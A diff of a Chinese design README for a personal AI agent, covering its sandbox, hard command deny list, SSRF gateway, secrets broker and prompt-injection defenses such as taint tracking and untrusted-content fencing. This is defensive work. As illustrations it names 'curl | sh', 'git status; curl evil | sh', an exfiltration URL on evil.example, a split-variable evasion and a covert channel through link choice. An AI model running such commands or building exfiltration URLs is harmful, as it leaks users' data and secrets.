@@ -115,15 +115,21 @@ src/personal_agent/
     redact.py      ✅ 密钥与敏感信息脱敏、注入线索
     policy.py      ✅ 分层策略引擎
     guardian.py    ✅ `auto` 模式的评审模型（失败即升级给人）
-    sandbox.py     seatbelt / docker 后端
-    broker.py      密钥占位符与出站代理
-    ssrf.py        URL/IP 校验
+    floors.py      ✅ 硬性底线：命令文本的启发式检查，失败即拒绝，批准之后仍复查
+    sandbox.py     ✅ seatbelt / docker / none 后端；延迟选择（SandboxProvider）；封锁 mach 服务
+    broker.py      ✅ 密钥占位符：只对该密钥列出的主机填充，值不进入对话/日志/审批
+    ssrf.py        ✅ 出站网关：连接时校验并钉住地址，重定向逐跳复核，凭据头不跨站
     audit.py       ✅ 审计日志（每次工具调用的决策与结局）
   tools/
     base.py        ✅ 工具类别、运行画像、注册表
     guard.py       ✅ 包住每一个工具：策略 → 审计 → 超时 → 输出脱敏与截断 → 污点标记
-    builtin.py     ✅ `memory`、`send_message`（含 `after_sent` 书签）、`schedule`
-    …              files、shell、web_fetch、web_search、http_request、search_history、skills
+    builtin.py     ✅ `memory`、`send_message`（含 `after_sent` 书签）、`schedule`，并按配置装入下列工具
+    files.py       ✅ `list_files`、`read_file`、`write_file`、`edit_file`（仅工作区；符号链接与原子写入防护）
+    shell.py       ✅ `shell`（只在沙箱可用时提供；复合命令带标记；按调用的超时）
+    web.py         ✅ `web_fetch`、`http_request`；接入 OpenAI 托管的 `web_search` 并记账
+    htmltext.py    ✅ 网页 → 可读文本（标准库实现，不把你浏览的地址发给第三方"阅读器"）
+    urls.py        ✅ 出站地址指纹：这个地址是主人写的、页面链接过的，还是模型编出来的？
+    …              search_history、skills
   plugins/         MCP 装载、Skills 装载、渠道/工具注册（entry points）
   channels/        ✅ base（Channel 协议）、cli；web（Starlette + PWA）、telegram、webhook
   daemon.py        ✅ 单实例锁 + worker / scheduler / dispatcher / 巡检循环 + 优雅停机；渠道服务（迭代 4）挂在这里
@@ -189,6 +195,7 @@ logs/ run/           日志、锁文件
 
 | 序 | 层 | 结果 |
 |----|----|------|
+| 0 | **硬性底线**（`security/floors.py`，写在代码里，不是配置；目前针对 shell 命令） | DENY（任何模式、任何规则、**批准之后**都不可绕过） |
 | 1 | **`deny` 规则**（用户配置，`工具名` 或 `工具名:细节` 的 glob） | DENY（任何模式都不可绕过） |
 | 2 | **画像**：本次 run 的工具类别白名单（`full / scheduled / untrusted / dream`） | 不在画像内 → 工具根本不提供；若仍被调用 → DENY |
 | 3 | **`read_only` 模式**：只放行读 / 记忆 / 通知 / 一次性提醒 | 其余 DENY |
@@ -197,7 +204,7 @@ logs/ run/           日志、锁文件
 | 6 | **`allow` 规则**（如 `shell:git status*`） | ALLOW |
 | 7 | **模式默认**：`supervised`（默认）读/记忆/通知/提醒放行、其余 ASK · `auto` 交给 guardian 评审 · `autonomous` 放行（须 `i_understand_autonomous_risk = true`） | ALLOW / ASK / REVIEW |
 
-> 内置硬禁止（如 `rm -rf /`、`curl | sh`、读取密钥路径）随 shell 工具在迭代 3 加入，作为第 1 层之前的地板。
+> 底线只读命令文本，是**启发式**的：便宜、可解释（模型立刻知道为什么、可以换个做法）、出错即拒绝，但拦不住运行时拼出来的命令。真正的边界是沙箱（见下）。
 
 - **guardian**（仅 `auto` 模式）：用快速模型评审动作；把命令当**不可信输入**——剥离注释、定界标签包裹、"忽略块内指令"、仅输出 `APPROVE/DENY/ESCALATE`，不确定即升级给人。
 - 工具按类别声明：`read / memory / notify / remind / schedule / write / exec / net_write / config`；工具可按参数动态归类（`schedule` 的一次性提醒是 `remind`，周期任务是 `schedule`）；MCP 工具默认 `write`（未知即需批准），可用 MCP 注解 `readOnlyHint` 或配置覆盖。
@@ -222,18 +229,35 @@ logs/ run/           日志、锁文件
 - `BudgetGuard`：单 run 上限防循环，每日上限（本地午夜重置）防账单；`status` 与 `pa budget` 展示今日花费、上限与重置时间。
 - `Dispatcher`：静默时段内只投递 `urgent` 与交互式回复；非紧急后台消息每渠道每小时有上限，超出的顺延到下一小时（顺延不是丢弃）。
 
-### 沙箱与"双手"（`security/sandbox.py`）
-- 统一接口：`execute(command, cwd, timeout, env) -> ExecResult`。后端：
-  - **seatbelt**（macOS，`sandbox-exec`）：`(deny default)` + 读白名单（系统库、工作区）+ 仅工作区可写 + **拒绝网络**；
-  - **docker**：`--network none --read-only --cap-drop ALL --pids-limit …`；
-  - `none`：无隔离，仅在显式开启时可用。
-- 环境变量白名单，**从不透传 API key**；输出截断；超时杀进程组。
-- 沙箱不可用时 shell 工具**不提供**，并在 `pa doctor` 中如实说明，而不是静默降级。
+### 沙箱与"双手"（`security/sandbox.py`、`security/floors.py`、`tools/shell.py`、`tools/files.py`）
+- 统一接口：`execute(command, *, timeout_s) -> ExecResult`。后端：
+  - **seatbelt**（macOS，`sandbox-exec`）：`(deny default)` + 系统库只读 + 工作区读写 + `[sandbox] extra_read` 里的目录只读 + **拒绝一切网络（含回环）**；另外显式封锁 mach 服务（AppleEvents、剪贴板、钥匙串、securityd、窗口服务）。已用真实进程验证：越界读写、联网、发信号、读剪贴板与钥匙串都被拒绝；
+  - **docker**：只拼 argv（不经 shell），`--network none`、只读根文件系统、`--cap-drop ALL`、pids 限制（**尚未对真实 daemon 验证**）；
+  - `none`：无隔离，必须同时写 `i_understand_no_sandbox = true`。
+- 环境变量白名单，**从不透传 API key**；输出截断；超时杀整个进程组（连同后台子进程）。
+- **选择是惰性的**：`SandboxProvider` 第一次需要时才探测机器，并真的跑一个小进程确认隔离有效；常驻进程启动时预热。沙箱不可用时 `shell` 工具**不提供**，`pa doctor` 如实说明，而不是静默降级。
+- **底线（floors）在策略之前**：`sudo`、格式化磁盘、`rm -rf` 系统目录、`curl | sh`、读取 `.ssh`/`.env`/钥匙串等密钥路径、改启动项……被拒绝且**不能被批准**。它读命令文本：看位置（`grep reboot` 不误伤）、先剥掉引号/反斜杠/`${IFS}`、出错即拒绝、批准之后执行前再查一次。**它不是边界**：`x=c; y=at; $x$y file` 能躲过文本检查，但在真实 seatbelt 测试里被沙箱拦下。
+- **文件工具**只能读写 `PA_HOME/workspace`（已安装技能的目录只读）；`.env`、数据库、记忆都在它之外，够不着。符号链接先解析再判断，写入用原子替换，有大小上限、不读二进制；`shell` 的规则能看到 `[compound]` 标记（含管道/分号/重定向的复合命令），所以"放行 `git status*`"不会连带放行 `git status; curl evil | sh`。
 
-### 密钥与出站网络（`security/broker.py`、`ssrf.py`）
-- 模型永远看不到密钥。`http_request` 里用 `{{secret:NAME}}` 占位符；仅当目标主机在该密钥的 `allowed_hosts` 内才替换；响应与日志中的密钥值被脱敏。
-- 所有出站（web_fetch / http_request）经 SSRF 校验：拒绝回环、私网、链路本地、云元数据地址；解析后再校验以抵御 DNS rebinding；限制重定向。
-- MCP stdio 服务器所需密钥由宿主启动器注入子进程环境，不经过模型。
+### 密钥、出站网络与"地址会带走数据"（`security/broker.py`、`security/ssrf.py`、`tools/web.py`、`tools/urls.py`）
+
+**出站网关**（`ssrf.py`，设计借鉴 hermes-agent 的连接时校验，代码为自写）
+- 校验发生在 httpx 之下的网络后端里：**连接时**解析域名，**每一个**解析结果都要通过检查，然后拨号到已验证的 IP（Host/SNI 保持原域名）——所以不存在"检查时是公网、连接时变私网"的窗口（DNS rebinding）。
+- 默认拒绝回环、私网、CGNAT、链路本地、组播；IPv4 映射/翻译/NAT64/6to4 按其内含的 IPv4 判断；**云元数据地址任何配置下都不可达**（`[net] allow_private` 也放不开）。
+- 每次重定向都是一个新请求，重新过网关；跨站重定向剥掉 `Authorization`/`Cookie`/`X-Api-Key`；带请求体的 307/308 不跨站重放；URL 里的 userinfo、反斜杠、控制字符、百分号编码的主机名一律拒绝；不读环境代理、不走 unix socket。
+- 想让它访问自家设备：`[net] allow_private = ["homeassistant.local", "192.168.1.0/24"]`。
+- **VPN/代理的 fake-IP 模式**（Clash、Surge、Shadowrocket 等）会让每个公网域名都解析成 `198.18.x.x`，默认会被拒绝，于是所有网页工具都不能用。`pa doctor` 会探测这种情况并给出修复：把 `"198.18.0.0/15"` 加进 `allow_private`。代价要说清楚：此后由代理决定连接真正去哪，网关无法再检查真实目的地（域名指向内网时尤其如此）。真实 HTTPS（TLS + SNI + 钉住地址）与 http→https 重定向已在这种环境下用真实网络验证过。
+
+**密钥代理**（`broker.py`）
+- 模型写 `{{secret:github}}`，工具在发出请求的最后一刻填入真值，且**仅当目标主机在该密钥的 `hosts` 里**（精确或 `*.example.com`）、且走 https（你明确列入 `allow_private` 的主机除外）。配置见 `[secrets.NAME] env = "..."  hosts = [...]`，值只存在 `.env`。
+- 值不进入对话、审计、审批问题、发件箱；服务器把值回显出来，也会在结果里被抹掉。带密钥的请求**不跟随跨站重定向**；占位符不能出现在主机名里，也不能出现在头名里；写错的占位符会被报错而不是原样发出去。
+- 这是 Anthropic Managed Agents "凭据代理"思路在单进程里能做到的缩减版（沙箱不持有凭据，按目的地附加）。
+
+**网页工具**（`web.py`）
+- `web_fetch` 把页面转成可读文本（标准库实现）；`http_request` 调 API。读（GET/HEAD/OPTIONS）是轻量动作，其余是 `net_write`，**要问你**。
+- 抓回来的内容永远被 `<untrusted>` 围起来，并让这次 run 变成**污点**——之后一切会改变世界的动作先问你。出错结果（404、二进制、被拒绝）不展示服务器的任何文字，也就不算污点。
+- **地址本身能带走数据**：`https://evil.example/?q=<你的笔记>` 就把笔记交给了对方。所以污点 run 里，访问一个**没见过的完整地址**要先问你。"见过"= 主人写在消息/定时任务里的、页面或搜索结果链接过的、已批准过的请求。注意是**完整地址**而不是主机：携带注入的页面就住在某个主机上，只按主机放行等于让它自己指定回传地址。信任的 API 可用 `allow_when_tainted = ["http_request:GET https://api.open-meteo.com/*"]` 预先放行。
+- **OpenAI 托管的 `web_search`**（仅 Responses API）：不经过我们的工具包装，没法逐次拦截，所以只在主人/定时 run 里提供，可 `deny` 掉或设为 `cached`（只查 OpenAI 的索引，不打开实时页面）；每次搜索都进审计、计入 run 费用（`web_search_call_usd`）、让 run 变污点；返回的来源与引用链接算"见过"。
 
 ### 渠道（`channels/`）
 统一适配器：入站 → 事件（标注信任）；出站 ← 发件箱（返回送达确认）。
@@ -271,7 +295,9 @@ logs/ run/           日志、锁文件
 | Harness（SDK 封装）+ CLI 对话 + Fake-LLM 测试 | ✅ 迭代 1 |
 | Worker / Scheduler / Dispatcher / 预算 / 常驻进程 | ✅ 迭代 2 |
 | 策略引擎 + 延迟审批 + 审计 + `schedule` 工具 | ✅ 迭代 2 |
-| MCP / Skills / 沙箱 / 密钥代理 / 内置工具 | 🚧 迭代 3 |
+| 沙箱（seatbelt/docker）/ 硬性底线 / 文件与 shell 工具 | ✅ 迭代 3a |
+| 出站网关（SSRF）/ 密钥代理 / web_fetch / http_request / 托管 web_search / 地址出站控制 | ✅ 迭代 3a |
+| MCP / Agent Skills / 插件注册表 | 🚧 迭代 3b |
 | Web PWA / Telegram / Webhook / 配对 / 语音 / 图像 | 🚧 迭代 4 |
 | 检索 / 压缩 / 上下文裁剪 / 做梦 / 子代理 | 🚧 迭代 5 |
 | 评测 / launchd 服务 / 加固 | 🚧 迭代 6 |
@@ -303,14 +329,39 @@ logs/ run/           日志、锁文件
 
 另有一次真实进程冒烟（不在测试套件里）：`pa serve` 起服务 → `pa status` 显示后台运行 → 第二个 `pa serve` 被拒绝 → `pa ask` 经服务提交 → 模型端点不可达时给出"稍后重试"提示 → SIGTERM 干净退出、锁释放。
 
-### 已知限制（截至迭代 2）
+### 迭代 3a 已被测试钉住的不变量
+
+（共 882 个测试；其中安全相关的几组都做过**变异验证**：把保护代码改坏，对应测试必须失败。）
+
+- **沙箱是真的**：真实 seatbelt 进程里，越界读写、联网（含回环）、发信号、读剪贴板与钥匙串都被拒绝；超时杀整个进程组；输出有上限；环境变量被清洗（`tests/test_sandbox.py`、`tests/test_shell_tool.py`）。
+- **底线不可被批准或配置绕过**：155 条用例覆盖该拦的与不该误伤的；底线检查出错就拒绝；批准之后执行前再查一次；沙箱消失时 `shell` 不再提供（`tests/test_floors.py`）。
+- **每个工具都在守卫之内**：文件与 shell 工具同样经过策略、审计、超时、脱敏与污点；`shell` 的规则能看到复合命令标记；每个工具可有自己的超时（`tests/test_guard.py`、`tests/test_file_tools.py`）。
+- **出站网关在传输层生效**：回环/私网/元数据/IPv4 包装被拒绝且服务器收不到任何请求；多个解析结果只要有一个不合格就整体不信；重定向逐跳复核；凭据头不跨站；307/308 不带着数据跨站；一个**专门的回归测试**证明守卫真的装在 httpx 传输上（`tests/test_ssrf.py`，用真实的本地 HTTP 服务器）。
+- **密钥不泄漏**：服务器与对话/审计/审批/发件箱的全部记录里，真值只出现在发给目标主机的那一个请求里；错主机、明文 http、主机名里的占位符、写错的占位符、没设值的密钥、带密钥的跨站重定向都被拒绝并解释（`tests/test_broker.py`、`tests/test_web_tools.py`）。
+- **网页内容是数据**：始终围在 `<untrusted>` 里，成功读取即让 run 变污点；失败结果不展示服务器文字、也不算污点；页面上的注入文本只会以数据出现（`tests/test_web_tools.py`）。
+- **地址不能带走数据**：污点 run 里访问没见过的完整地址要先问；同主机不是理由；页面链接、搜索来源、引用、主人写的地址、已批准的请求算"见过"；拼写差异（大小写、`#片段`、默认端口）不影响；等待审批期间"见过的地址"随挂起状态保存并在恢复后仍有效；`allow_when_tainted` 可预先放行；`read_only` 直接拒绝（`tests/test_web_tools.py`）。
+- **托管搜索被如实记账**：每次搜索进审计（`layer = hosted`）、计费、让 run 变污点；返回的来源与引用链接被记为"见过"；`deny` 规则、`off`/`cached` 开关与非 Responses API 都会让它不被提供（`tests/test_web_tools.py`）。它无法逐次拦截，见下方已知限制。
+- **`pa init` 生成的 `config.toml` 里每个示例都有效**（`tests/test_config_template.py`）；`pa doctor` 报告沙箱、web 工具、密钥与过宽的 `allow_private`（`tests/test_capability_checks.py`）。
+
+### 已知限制（截至迭代 3a）
 
 - **会话窗口是权宜之计**：模型只看到最近 `agent.history_items` 条（默认 400，从最近的用户消息处对齐，避免切断工具往返），日志保留全部。窗口滑动会让提示缓存在那一刻失效；带摘要的压缩与工具结果清理在迭代 5 实现。
-- **目前只有三个工具**（`memory`、`send_message`、`schedule`）；文件、shell、网络、MCP、Skills 在迭代 3。
+- **还没有 MCP / Skills**（迭代 3b）；`search_history` 与子代理在迭代 5。
 - **还没有终端以外的渠道**：没有注册对应渠道时，后台消息留在终端"信箱"，下次 `pa chat` 打开时送达；Web/Telegram/Webhook 在迭代 4。
 - **终端与后台服务之间没有即时通知**：客户端模式靠 `runtime.poll_s`（默认 1 秒）轮询，所以 `pa ask` 经服务提交会有至多约一秒的起步延迟。
 - **服务不会开机自启**：`pa serve` 在前台运行；launchd 常驻服务在迭代 6。
+- **底线是启发式的**：它读命令文本，拦不住运行时拼出来的命令；真正的边界是沙箱。选 `backend = none` 就等于只剩底线。
+- **沙箱需要看得见工具链**：只读白名单默认是系统目录与工作区；放在别处的解释器/工具链要用 `[sandbox] extra_read` 加上。docker 后端的参数没有对真实 daemon 验证过。
+- **fake-IP 代理与出站网关互相抵消**：允许 `198.18.0.0/15` 之后，网关看到的只是代理发的假地址，防"域名指向内网"的检查对这类域名失效；字面 IP（`10.0.0.1`、`169.254.169.254`、`localhost`）仍照常被拒。
+- **托管 `web_search` 无法逐次拦截**：它由 OpenAI 执行；我们只能决定提供与否、事后审计与记账。要最严格的控制，用 `web_search = "off"` 或 `"cached"`，改用我们自己的 `web_fetch`。
+- **污点不跨 run**：一个 run 读到的恶意内容如果被写进记忆或工作区文件，下一个 run 会把它当成自己的笔记（记忆索引已声明"是数据不是指令"，但这不是硬隔离）。这是已知的残余风险，迭代 5 的"做梦"会以转录为准校验笔记。
+- **"见过的地址"挡不住低带宽的暗道**：攻击者可以放一批链接，靠模型"选哪个"传出几个比特。完整地址规则挡住的是把数据拼进地址这种高带宽通道。
+- **托管工具的内容我们看不到**：`web_search` 读到的页面由 OpenAI 直接放进模型上下文，不会经过我们的 `<untrusted>` 围栏与脱敏；我们能做的是让这次 run 变污点，并限制之后的动作。
 
 ### 尚未验证（需要真实 `OPENAI_API_KEY`）
 
-本环境没有 key，下面几点只能由你在本机验证：运行 `pa doctor --live`（两次真实调用，几美分）。它会检查 key 与模型名是否有效、工具 schema 是否被接受，以及**无状态模式下把存档历史（含加密推理项）回放给 API** 是否成功。若回放失败，备选方案是把 `reasoning_item_id_policy` 设为 `omit`（已在设计中预留）。
+本环境没有 key，下面几点只能由你在本机验证：运行 `pa doctor --live`（两次真实调用，几美分）。它会检查 key 与模型名是否有效、工具 schema 是否被接受，以及**无状态模式下把存档历史（含加密推理项）回放给 API** 是否成功。若回放失败，备选方案是把 `reasoning_item_ids = "omit"`（已在设计中预留）。
+
+另外两处同样只能在有 key 时验证：
+- **托管 `web_search`**：`web_search_call` 的 `action`/`sources` 与 `url_citation` 的解析按 SDK 的类型编写、用同类型的对象测过，但没有对真实 API 的返回验证；请求里附带的 `include = web_search_call.action.sources` 是否被你的模型接受也需要真实调用确认（不接受时把 `[tools] web_search = "off"`，其余功能不受影响）。
+- **docker 沙箱后端**：命令行参数没有对真实 Docker daemon 跑过（macOS 上默认用 seatbelt，已用真实进程验证）。
